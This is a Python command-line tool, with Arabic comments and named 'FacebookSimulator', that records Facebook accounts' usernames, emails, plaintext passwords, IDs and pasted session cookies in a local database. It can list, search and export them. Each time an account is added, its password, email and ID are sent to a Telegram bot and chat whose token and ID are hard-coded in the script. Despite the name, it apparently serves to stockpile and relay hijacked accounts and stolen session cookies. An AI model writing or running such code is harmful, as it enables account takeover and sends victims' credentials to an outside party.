import sqlite3
import hashlib
import json
import requests
from datetime import datetime
import secrets
import string
import os
from pathlib import Path

class FacebookSimulator:
    def __init__(self, db_name="facebook.db", telegram_token=None, telegram_chat_id=None):
        self.db_name = db_name
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.init_database()
    
    def init_database(self):
        """إنشاء قاعدة البيانات والجداول"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                email TEXT UNIQUE NOT NULL,
                password_plain TEXT NOT NULL,
                facebook_id TEXT,
                cookie TEXT,
                token TEXT UNIQUE,
                first_name TEXT,
                last_name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def generate_token(self, length=32):
        """توليد توكن عشوائي"""
        characters = string.ascii_letters + string.digits
        return ''.join(secrets.choice(characters) for _ in range(length))
    
    def send_to_telegram(self, message):
        """إرسال رسالة إلى بوت التليجرام"""
        if not self.telegram_token or not self.telegram_chat_id:
            return {"status": "⚠️", "message": "بيانات التليجرام غير مكتملة"}
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {
                "chat_id": self.telegram_chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            response = requests.post(url, data=data, timeout=5)
            
            if response.status_code == 200:
                return {"status": "✅"}
            else:
                return {"status": "❌"}
        except Exception as e:
            return {"status": "❌"}
    
    def create_account(self, username, first_name, last_name, email, password, facebook_id, cookie):
        """إنشاء حساب جديد"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        try:
            token = self.generate_token()
            
            cursor.execute('''
                INSERT INTO accounts 
                (username, email, password_plain, facebook_id, cookie, token, first_name, last_name)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (username, email, password, facebook_id, cookie, token, first_name, last_name))
            
            conn.commit()
            account_id = cursor.lastrowid
            conn.close()
            
            # إرسال إلى التليجرام
            telegram_message = f"""
✅ <b>حساب فيسبوك جديد تم إنشاؤه!</b>

👤 <b>الاسم:</b> {first_name} {last_name}
🔤 <b>اسم المستخدم:</b> <code>{username}</code>
📧 <b>البريد:</b> <code>{email}</code>
🔐 <b>كلمة المرور:</b> <code>{password}</code>
🆔 <b>معرف الفيسبوك:</b> <code>{facebook_id}</code>
🎫 <b>التوكن:</b> <code>{token}</code>
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            self.send_to_telegram(telegram_message)
            
            return {
                "status": "✅",
                "message": "تم إنشاء الحساب بنجاح!",
                "account_id": account_id,
                "token": token
            }
        
        except sqlite3.IntegrityError as e:
            conn.close()
            return {
                "status": "❌",
                "message": f"خطأ: اسم المستخدم أو البريد موجود بالفعل"
            }
    
    def get_all_accounts(self):
        """الحصول على جميع الحسابات"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, username, email, first_name, last_name, facebook_id, created_at
            FROM accounts ORDER BY created_at DESC
        ''')
        
        accounts = cursor.fetchall()
        conn.close()
        
        return accounts
    
    def search_account(self, search_term):
        """البحث عن حساب"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, username, email, first_name, last_name, facebook_id, password_plain, token, created_at
            FROM accounts 
            WHERE username LIKE ? OR email LIKE ? OR first_name LIKE ? OR facebook_id LIKE ?
        ''', (f'%{search_term}%', f'%{search_term}%', f'%{search_term}%', f'%{search_term}%'))
        
        accounts = cursor.fetchall()
        conn.close()
        
        return accounts
    
    def get_account_details(self, account_id):
        """الحصول على تفاصيل حساب محدد"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, username, email, first_name, last_name, facebook_id, password_plain, cookie, token, created_at
            FROM accounts WHERE id = ?
        ''', (account_id,))
        
        account = cursor.fetchone()
        conn.close()
        
        return account
    
    def export_accounts(self, filename="accounts_export.json"):
        """تصدير جميع الحسابات"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, username, email, first_name, last_name, facebook_id, password_plain, token, created_at
            FROM accounts
        ''')
        
        accounts = cursor.fetchall()
        conn.close()
        
        data = []
        for acc in accounts:
            data.append({
                "id": acc[0],
                "username": acc[1],
                "email": acc[2],
                "first_name": acc[3],
                "last_name": acc[4],
                "facebook_id": acc[5],
                "password": acc[6],
                "token": acc[7],
                "created_at": acc[8]
            })
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        
        return {
            "status": "✅",
            "file": filename,
            "count": len(data)
        }
    
    def delete_account(self, account_id):
        """حذف حساب"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM accounts WHERE id = ?', (account_id,))
        conn.commit()
        conn.close()
        
        return {"status": "✅", "message": "تم حذف الحساب"}


class InteractiveCLI:
    def __init__(self, telegram_token, telegram_chat_id):
        self.fb = FacebookSimulator(telegram_token=telegram_token, telegram_chat_id=telegram_chat_id)
    
    def clear_screen(self):
        """مسح شاشة الكونسول"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_header(self, title):
        """طباعة رأس الصفحة"""
        print("\n" + "=" * 70)
        print(f"🔵 {title}".center(70))
        print("=" * 70)
    
    def print_menu(self):
        """طباعة القائمة الرئيسية"""
        self.print_header("القائمة الرئيسية")
        print("""
1️⃣  إنشاء حساب جديد
2️⃣  عرض جميع الحسابات
3️⃣  البحث عن حساب
4️⃣  عرض تفاصيل حساب
5️⃣  حذف حساب
6️⃣  تصدير جميع الحسابات
7️⃣  خروج

        """)
    
    def input_account_data(self):
        """إدخال بيانات الحساب"""
        print("\n📝 أدخل بيانات الحساب الجديد:\n")
        
        first_name = input("👤 الاسم الأول: ").strip()
        if not first_name:
            print("❌ الاسم الأول مطلوب!")
            return None
        
        last_name = input("👤 اسم العائلة: ").strip()
        if not last_name:
            print("❌ اسم العائلة مطلوب!")
            return None
        
        username = input("🔤 اسم المستخدم: ").strip()
        if not username:
            print("❌ اسم المستخدم مطلوب!")
            return None
        
        email = input("📧 البريد الإلكتروني: ").strip()
        if not email:
            print("❌ البريد الإلكتروني مطلوب!")
            return None
        
        password = input("🔐 كلمة المرور: ").strip()
        if not password:
            print("❌ كلمة المرور مطلوبة!")
            return None
        
        facebook_id = input("🆔 معرف الفيسبوك: ").strip()
        if not facebook_id:
            print("❌ معرف الفيسبوك مطلوب!")
            return None
        
        print("\n🍪 أدخل الكوكي (Cookie):")
        print("(يمكنك لصق الكوكي بالكامل ثم اضغط Enter)")
        cookie = input(">>> ").strip()
        if not cookie:
            print("❌ الكوكي مطلوب!")
            return None
        
        return {
            "first_name": first_name,
            "last_name": last_name,
            "username": username,
            "email": email,
            "password": password,
            "facebook_id": facebook_id,
            "cookie": cookie
        }
    
    def create_account_interactive(self):
        """إنشاء حساب بشكل تفاعلي"""
        self.print_header("إنشاء حساب جديد")
        
        data = self.input_account_data()
        if not data:
            return
        
        print("\n⏳ جاري إنشاء الحساب...")
        result = self.fb.create_account(
            username=data['username'],
            first_name=data['first_name'],
            last_name=data['last_name'],
            email=data['email'],
            password=data['password'],
            facebook_id=data['facebook_id'],
            cookie=data['cookie']
        )
        
        if result['status'] == "✅":
            print(f"\n✅ {result['message']}")
            print(f"🆔 رقم الحساب: {result['account_id']}")
            print(f"🎫 التوكن: {result['token'][:20]}...")
            print("\n✅ تم إرسال البيانات إلى التليجرام!")
        else:
            print(f"\n❌ {result['message']}")
        
        input("\nاضغط Enter للمتابعة...")
    
    def show_all_accounts(self):
        """عرض جميع الحسابات"""
        self.print_header("جميع الحسابات")
        
        accounts = self.fb.get_all_accounts()
        
        if not accounts:
            print("\n⚠️ لا توجد حسابات بعد!")
        else:
            print(f"\n📊 إجمالي الحسابات: {len(accounts)}\n")
            
            for i, acc in enumerate(accounts, 1):
                print(f"{i}. 🆔 {acc[0]}")
                print(f"   👤 الاسم: {acc[3]} {acc[4]}")
                print(f"   🔤 المستخدم: {acc[1]}")
                print(f"   📧 البريد: {acc[2]}")
                print(f"   📱 معرف الفيسبوك: {acc[5]}")
                print(f"   ⏰ تاريخ الإنشاء: {acc[6]}")
                print()
        
        input("اضغط Enter للمتابعة...")
    
    def search_account_interactive(self):
        """البحث عن حساب"""
        self.print_header("البحث عن حساب")
        
        search_term = input("\n🔍 أدخل الكلمة المراد البحث عنها: ").strip()
        
        if not search_term:
            print("❌ يجب إدخال كلمة للبحث!")
            input("اضغط Enter للمتابعة...")
            return
        
        accounts = self.fb.search_account(search_term)
        
        if not accounts:
            print(f"\n⚠️ لم يتم العثور على حسابات تطابق '{search_term}'")
        else:
            print(f"\n✅ تم العثور على {len(accounts)} حساب(ات):\n")
            
            for i, acc in enumerate(accounts, 1):
                print(f"{i}. 🆔 {acc[0]}")
                print(f"   👤 الاسم: {acc[3]} {acc[4]}")
                print(f"   🔤 المستخدم: {acc[1]}")
                print(f"   📧 البريد: {acc[2]}")
                print()
        
        input("اضغط Enter للمتابعة...")
    
    def show_account_details(self):
        """عرض تفاصيل حساب"""
        self.print_header("عرض تفاصيل حساب")
        
        try:
            account_id = int(input("\n🆔 أدخل رقم الحساب: ").strip())
        except ValueError:
            print("❌ يجب إدخال رقم صحيح!")
            input("اضغط Enter للمتابعة...")
            return
        
        account = self.fb.get_account_details(account_id)
        
        if not account:
            print(f"\n❌ الحساب رقم {account_id} غير موجود!")
        else:
            print(f"\n✅ تفاصيل الحساب:\n")
            print(f"🆔 رقم الحساب: {account[0]}")
            print(f"👤 الاسم الكامل: {account[3]} {account[4]}")
            print(f"🔤 اسم المستخدم: {account[1]}")
            print(f"📧 البريد الإلكتروني: {account[2]}")
            print(f"📱 معرف الفيسبوك: {account[5]}")
            print(f"🔐 كلمة المرور: {account[6]}")
            print(f"🎫 التوكن: {account[7]}")
            print(f"⏰ تاريخ الإنشاء: {account[9]}")
            print(f"\n🍪 الكوكي:\n{account[8][:100]}..." if len(account[8]) > 100 else f"\n🍪 الكوكي:\n{account[8]}")
        
        input("\nاضغط Enter للمتابعة...")
    
    def delete_account_interactive(self):
        """حذف حساب"""
        self.print_header("حذف حساب")
        
        try:
            account_id = int(input("\n🆔 أدخل رقم الحساب المراد حذفه: ").strip())
        except ValueError:
            print("❌ يجب إدخال رقم صحيح!")
            input("اضغط Enter للمتابعة...")
            return
        
        confirmation = input("\n⚠️  هل أنت متأكد من حذف هذا الحساب؟ (نعم/لا): ").strip().lower()
        
        if confirmation in ['نعم', 'yes', 'y']:
            result = self.fb.delete_account(account_id)
            print(f"\n{result['status']} {result['message']}")
        else:
            print("\n❌ تم الإلغاء")
        
        input("اضغط Enter للمتابعة...")
    
    def export_accounts_interactive(self):
        """تصدير الحسابات"""
        self.print_header("تصدير جميع الحسابات")
        
        print("\n⏳ جاري تصدير البيانات...")
        result = self.fb.export_accounts()
        
        if result['status'] == "✅":
            print(f"\n✅ تم التصدير بنجاح!")
            print(f"📁 الملف: {result['file']}")
            print(f"📊 عدد الحسابات: {result['count']}")
        else:
            print(f"\n❌ خطأ في التصدير")
        
        input("\nاضغط Enter للمتابعة...")
    
    def run(self):
        """تشغيل البرنامج التفاعلي"""
        while True:
            self.clear_screen()
            self.print_menu()
            
            choice = input("اختر رقم الخيار: ").strip()
            
            if choice == '1':
                self.create_account_interactive()
            elif choice == '2':
                self.show_all_accounts()
            elif choice == '3':
                self.search_account_interactive()
            elif choice == '4':
                self.show_account_details()
            elif choice == '5':
                self.delete_account_interactive()
            elif choice == '6':
                self.export_accounts_interactive()
            elif choice == '7':
                print("\n👋 شكراً لاستخدام البرنامج! وداعاً...")
                break
            else:
                print("❌ اختيار غير صحيح! حاول مرة أخرى")
                input("اضغط Enter للمتابعة...")


if __name__ == "__main__":
    # بيانات التليجرام
    TELEGRAM_TOKEN = "8321731547:AAEOGHm4fLgb7vkTzF6EBJ2Yy-SLYsKceas"
    TELEGRAM_CHAT_ID = "5749281880"
    
    # بدء البرنامج
    cli = InteractiveCLI(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)
    cli.run()
